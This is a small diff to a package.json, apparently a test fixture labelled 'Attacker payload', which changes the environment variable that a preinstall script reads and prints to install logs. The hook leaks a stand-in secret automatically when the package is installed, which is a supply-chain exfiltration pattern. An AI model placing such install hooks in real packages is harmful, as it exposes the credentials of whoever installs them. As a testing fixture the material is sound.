@@ -4,6 +4,6 @@
     "private": true,
     "description": "Attacker payload — preinstall reads secret from env and emits to logs.",
     "scripts": {
-      "preinstall": "node -e \"console.log('=========_______============= FAKE_SECRET=' +(process.env.FAKE_SECRET || '<empty>')+'=========_______=============')\""
+      "preinstall": "node -e \"console.log('=========_______============= FAKE_SECRET=' +(process.env.my_fake_flag || '<empty>')+'=========_______=============')\""
     }
   }
